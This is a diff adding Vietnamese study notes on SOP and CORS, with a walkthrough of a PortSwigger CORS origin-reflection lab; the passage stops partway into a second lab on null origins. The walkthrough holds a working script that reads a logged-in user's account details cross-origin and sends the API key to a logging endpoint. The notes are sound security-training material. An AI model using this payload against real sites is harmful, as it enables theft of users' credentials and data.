@@ -250,3 +250,169 @@ Trước hết, cors là cơ chế của browser nhằm kích hoạt việc truy
 
 ![image](https://user-images.githubusercontent.com/104350480/225514370-2d47d49c-eeaf-4c2f-a2a0-336853d7441d.png)
 
+###  Để hiểu rõ hơn đầu tiên ta sẽ cùng di tìm hiểu lại SOP là gì? 
+
+SOP là một cơ chế bảo mật của web browser nhằm ngăn chặn các website tấn công lẫn nhau. Về cơ bản, sop sẽ ngăn ngừa script từ một origin nào đấy truy cập dữ liệu của một origin khác. Origin ở đây bao gồm 3 thành phần sẽ được so là URI schemt, domain và port. Ví dụ như ta có url: http://mywebsite.com/index.html, thì url scheme là http, domain là mywebsite.com, và port number ở đây mặc định sẽ là 80.
+Chỉ cần không thỏa mãn 1 trong 3 cái trên thì sẽ được coi là không hợp lệ, chẳng hạn như origin là https://mywebsite.com/index.html,http://www.mywebsite.com/ hay http://mywebsite.com:8000 đều là không hợp lệ ....
+
+Ví dụ: điều gì sẽ xảy ra khi rakhoitv.com origin cố truy cập vào tài nguyên của google.com origin
+
+![image](https://user-images.githubusercontent.com/104350480/225565546-61fe6045-09d1-44be-907c-df656d7d9fd8.png)
+
+origin rakhoitv.com sẽ bị block bởi SOP.
+
+
+### Tác dụng của SOP ở đây để làm gì?
+ 
+Http request mà browser gửi từ 1 origin đến một origin khác có thể kèm theo cả cookies như authenticationc cookie. Lúc này response trả về sẽ nằm trong 'khuôn khổ' của user'session và bao gồm các dữ liệu cụ thể của user đang tương tác. Và như thế thì nếu user vào các website độc hại mà không có SOP thì đám thông tin riêng tư của user sẽ bị lộ ra và có thể bị tấn công.
+
+### SOP triển khai hoạt động như thế nào?
+
+Bàn cụ thể về việc triển khai, nhìn chung, SOP sẽ kiểm tra xem việc truy cập của js đến cá loaded cross-doamin content ( tức là các nội dung được tải giữa các domain). Ví dụ một trang cụ thể có thể load được external resource ( ví dụ như embedded image với **<img>tag** hay embedded media với **<video>tag** nhưng js trên các trang này sẽ bị ngăn cấp việc đọc nội dung của các tài nguyên nói trên. Tuy nhiên sẽ có một số trường hợp ngoại lệ như: 
+  - Các obj rơi vào dạng **writable - but not readable cross-domain** ví dụ như location obj hoặc href property từ **iframes** hoặc **new windows**
+  - Các obj rơi vào dạng **readable - but not writable cross-domain** ví dụ length property của window obj ( dùng lưu trữ số frames được trang sử dụng) và closed property.
+  
+  Ngoài ra, để đáp ứng legacy requirements (tức là yêu cầu từ các hệ thống cũ), SOP cũng sẽ “nhẹ tay” hơn khi xử lý đám cookies để các subdomain của một site sẽ có thể truy cập dù về nguyên tắc việc này là sai trái (lỗi different domain). Với tình huống này, tôi sẽ có thể giảm thiểu nguy cơ bị tấn công thông qua việc sử dụng HttpOnly cookie flag (tức là client side script sẽ không thể truy cập vào cookie này mà chỉ bên server side có thể tác động).
+
+  
+ ### CORS là gì?
+  
+  Cors - cross resource sharing (cors) là một cơ chế bảo mật trong trình duyệt web, cho phép các trang web từ các nguồn gốc khác nhau trao đổi dữ liệu. Điều này cho phép các trang web tải và sử dụng tài nguyên từ các nguồn gốc khác nhau như ứng dụng web của bên thứ ba, API web, hình ảnh, video và nhiều tài nguyên khác. Vì vậy có thể nói Cors giúp mở rộng và tăng cường độ linh hoạt cho SOP, ta có thể hiểu CORS là một dạng biến thể để giảm bớt độ 'strict' của SOP như các trường hợp ngoại lệ nói trên. 
+  
+  Trong CORS, trình duyệt sẽ thêm các header vào yêu cầu và phản hồi HTTP để đảm bảo rằng các yêu cầu được gửi từ một nguồn gốc nhất định chỉ được truy cập các tài nguyên được phép và trong phạm vi cho phép. Các header này bao gồm Origin, Access-Control-Allow-Origin, Access-Control-Request-Method, Access-Control-Allow-Methods, Access-Control-Request-Headers và Access-Control-Allow-Headers.
+  
+Ví dụ cụ thể về CORS giữa hai tên miền a và b có thể được miêu tả như sau:
+
+    ![image](https://user-images.githubusercontent.com/104350480/225567014-81acb663-d39f-4dd3-a1d4-9c73fbd6b264.png)
+  
+Tên miền a: https://shop.com
+Tên miền b: https://analytics.com
+Trên trang web của shop.com, chúng ta cần lấy dữ liệu từ trang web analytics.com. Để làm được điều này, chúng ta cần cấu hình CORS để cho phép truy cập dữ liệu giữa hai tên miền này.
+
+Trên trang web của analytics.com, chúng ta cần thêm một vài header vào phản hồi của tài nguyên mà chúng ta muốn truy cập từ shop.com. Header Access-Control-Allow-Origin được sử dụng để chỉ định tên miền hoặc danh sách các tên miền được phép truy cập tài nguyên này. Để cho phép truy cập từ shop.com, ta sẽ đặt giá trị header này thành 'https://shop.com' hoặc '*'.
+  
+  
+  ```
+  // trên trang web của analytics.com
+
+// lấy dữ liệu từ một API
+app.get('/api/data', function(req, res) {
+
+  // đặt header cho phép truy cập từ tên miền khác
+  res.setHeader('Access-Control-Allow-Origin', 'https://shop.com');
+
+  // gửi dữ liệu về phản hồi
+  res.send({
+    data: 'some data'
+  });
+});
+
+  ``` 
+  
+  Ở phía shop.com, chúng ta có thể sử dụng XMLHttpRequest để lấy dữ liệu từ analytics.com:
+  
+  ```
+  // trên trang web của shop.com
+
+var xhr = new XMLHttpRequest();
+xhr.open('GET', 'https://analytics.com/api/data', true);
+
+// cấu hình CORS
+xhr.withCredentials = true;
+
+xhr.onload = function() {
+  console.log(xhr.responseText);
+};
+
+xhr.send();
+
+  ```
+  Ta dùng withCredentials để cho phép cookie được phép truyền qua CORS ( cần có cấu hình này vì nếu không có cookie sẽ không được gửi qua và chúng ta sẽ không thể đăng nhập vào trang web của analytics.com). Ngoài ra dùng XMLHttpRequest ở đây hay dùng khá nhiều trong bài lab này vì xử lí bất đồng bộ cho phép ta tương tác với máy chủ mà không cần phải tải lại toàn bộ trang hay các mã js có thể tiếp tục được thực thi mà kh phải ngắt đợi nhau.
+  
+  Hoặc một ảnh minh họa cấu hình cors trong java: 
+  
+  ![image](https://user-images.githubusercontent.com/104350480/225570179-cc091c57-2394-4cb6-8312-2fdbb75191de.png)
+
+  
+  ### Tiếp theo ta sẽ bàn luận về cors header là gì?
+  
+  Cors header ở đây là việc các header được sử dụng trong cơ chế cors để cho phép hoặc từ chối các truy cập giữa ccs tài nguyên giữa các origin khác nhau. Khi một trang web tải một tài nguyên từ một origin khác thì trình duyệt sẽ gửi một yêu cầu preflight ( được gọi là yêu cầu xác thực trước đến server) để kiểm tra xem việc truy cập đến tài nguyên đó có được phép hay không. Các Cors header thường gặp như:
+  Access-Control-Allow-Origin, Access-Control-Allow-Credentials. 
+  
+  - Trong đó thì Access-Control-Allow-Origin: chỉ định origin mà server cho phép truy cập vào tài nguyên. Nếu header này không được cung cấp, trình duyệt sẽ không cho phép truy cập đến tài nguyên này. Còn Access-Control-Allow-Credentials là một HTTP response header, được sử dụng trong chính sách CORS (Cross-Origin Resource Sharing) để cho phép truy cập nguồn gốc chéo với yêu cầu có chứa thông tin xác thực, chẳng hạn như cookie và HTTP Authentication. 
+  Một vài syntax như : Access-Control_Allow-Origin: * ( không thể sử dụng Access-Control-Allow-Credentials để chia sẻ cookie hoặc thông tin xác thực vì điều này có thể tiềm ẩn rủi ro bảo mật cho người dùng.), nó cho phép bất kì trang web nào cũng có thể truy cập tài nguyên của trang web nhưng phải có nguồn gốc cụ thể, <origin> chỉ định hay cho phép một nguồn truy cập duy nhất vào tài nguyên trang web bao gồm cả trang web không có origin ( nhưng chỉ có thể truy cập được từ phía client-side của cùng một trang web mà tài nguyên đã được phát hành từ đó.)
+  
+  
+  ### Cors Vulnerabilities:
+  
+  _ Ta có một ví dụ về lỗi cors như sau: Chẳng hạn có một ngân hàng và ta có một người dùng truy cập vào ứng dụng ngân hàng đó để đăng nhập tài khoản và người dùng này duy trì trạng thái đăng nhập trên app hoặc website, sau đó người dùng này tìm hình ảnh 1 con mèo trong 1 trang là cat-pics.com, bây giờ người dùng chỉ tập trung vào hình ảnh những con mèo cute, tuy nhiên thì người dùng này không biết trang web là độc hại nên khi người dùng đang xem ảnh, thì nó yêu cầu tài nguyên của trang wbe ngân hàng và nếu trang web được cấu hình sai cách:
+  
+  ![image](https://user-images.githubusercontent.com/104350480/225578849-f43c0bce-997d-430c-bc45-c4b4ca22b50f.png)
+  
+  Nó cho phép trang web kia thực hiện truy xuất tài nguyên từ trang web ngân hàng và các cuộc tấn công có thể diễn ra. Ở đây Cors vul được sinh ra từ việc cách cấu hình cors có vấn đề gây ra rủi ro bảo mật.
+Việc cho phép truy cập vào tài nguyên giữa các tên miền khác nhau đôi khi là bắt buộc vì 1 số trang web về mua sắm thì cần phải tin tưởng các trang web ngân hàng khác để có thể thực hiện được việc thanh toán. Còn dài quá, thôi vào bài lab cho dễ hiểu: 
+
+  ### [1. CORS vulnerability with basic origin reflection](https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack)
+  
+  Ta đăng nhập vào tài khoản với wiener:peter :
+
+![image](https://user-images.githubusercontent.com/104350480/225526545-ff433653-1b23-4d7d-9ab7-f2af322aacbf.png)
+
+  Ở phần này ta có thể thấy có thêm sự xuất hiện mới là API Key tại chỗ My Account. Check qua burp suite proxy history, ta sẽ quan sát thấy api Key được trả về thông qua cái asynchronous javascript and xml- gọi ngắn gon là ajax request đến /accountDetails. Đồng thời ta để ý response cũng chứa Access-Control-Allow-Credentials header cho thấy ứng dụng có chứa hỗ trợ CORS và đang được để là true.
+  
+  
+  ![image](https://user-images.githubusercontent.com/104350480/225557507-4dc41852-034f-456a-827b-63e17c0e4d71.png)
+
+  Tất nhiên ở đây ta sẽ không quan tâm đến cái apiKey của th wiener làm gì, cái ta cần là apiKey của th admin cơ. Trước tiên thì ta cần xem là trang web này có bị cấu hình sai cho phép ta khai thác không.
+Ta thêm thử Origin bất kì vào bên request, thì có thể thấy ở bên response có trả về giá trị origin ta truyền vào, tức là cái origin nào truyền vào cũng được luôn. Còn nếu đưa ra lỗi thì ta sẽ đến với bài lab sau rồi tính: 
+  
+  ![image](https://user-images.githubusercontent.com/104350480/225558245-5c152ad5-1df0-4a2a-9c75-3a317dcc647f.png)
+
+  Ở đây ta không chỉ có quyền truy cập tài nguyên từ 1 origin bất kì mà còn có thể tân dụng cái Access-Control-Allow-Credentials: true để không chỉ đọc tài nguyên public mà còn có cả riêng tư. ( ta có thể nhớ lại lí thuyết phần này: Access-Control-Allow-Credentials: true là một header trong CORS cho phép truy cập tài nguyên với thông tin xác thực (credentials) như cookie, HTTP authentication. Khi header này được set là true, trình duyệt sẽ cho phép các yêu cầu AJAX từ trang web gốc (origin) có chứa các thông tin xác thực trong yêu cầu tới các trang web khác (cross-origin) để truy cập các tài nguyên. )
+Ta ta có thể sử dụng script như sau để exploit bên phái server và đọc API key: 
+  
+  ```
+  <script>
+
+    var req = new XMLHttpRequest();
+    
+    var url='https://0aee00f9030e83fbc18e808200650026.web-security-academy.net'
+
+    req.open('GET',url+'/accountDetails',true);
+
+    req.withCredentials = true;
+    // onreadystatechange sẽ được gọi mỗi khi trạng thái yêu cầu thay đổi
+    req.onreadystatechange = function() {
+      if (req.readyState == XMLHttpRequest.DONE){
+    // sử dụng phương thức fetch() để gửi một yêu cầu HTTP GET đến đường dẫn '/log', ta để ở đây đường dẫn gì cũng được, tham số cũng vậy, chủ yếu để phân biệt chỗ giá trị ta get về thôi
+            fetch('/log?key=' + req.responseText)
+    }
+    }
+
+    req.send(null);
+
+
+</script>
+  
+  ```
+  Script trên sẽ yêu cầu trình duyệt gửi đi bất kì cookie nào mà trình duyệt đã lưu trữ
+  Truy cập vào phần access Log ta thấy được: 
+  
+  ![image](https://user-images.githubusercontent.com/104350480/225558967-126730ee-925e-4211-bbf5-9597630b53e9.png)
+
+  > %20%20%22username%22:%20%22administrator%22,%20%20%22email%22:%20%22%22,%20%20%22apikey%22:%20%22k1fxK3VjvQF8uSZXS9imoeHxNPYpy4sr%22,%20%20%
+  
+  Decode url ta được:
+  
+  >   "username": "administrator",  "email": "",  "apikey": "k1fxK3VjvQF8uSZXS9imoeHxNPYpy4sr",  %
+  
+  Ở đây ta có dược apiKey của administrator và submit solution ta solve được bài lab: k1fxK3VjvQF8uSZXS9imoeHxNPYpy4sr
+  
+  ### [2. Lab: CORS vulnerability with trusted null origin](https://portswigger.net/web-security/cors/lab-null-origin-whitelisted-attack)
+  
+  - Tiếp theo ở bài lab thứ hai này ta sẽ đến 1 tình huống thực tế hơn, cụ thể là ở một số ứng dụng hỗ trợ mutiple origins thông qua việc sử dụng allowed origin whitelist ( tức là danh sách các origin được cấp phép). Lúc này khi nhận 1 cors request, ứng dụng sẽ soi cái origin trong request rồi đối chiếu với allowed origin whitelist. Nếu xác nhận có thông tin tương ứng trong cái whitelist, origin này sẽ đâm vào Access-Control-Allow-Origin header của response ( và ta sẽ có thể truy cập được).
+  
+- Cụ thể trong tình huống này ta sẽ khai thác cái specifiction hỗ trợ null value của origin header. Thông thường, browser sẽ gửi null value trong Origin header trong 
+  
+  
+  
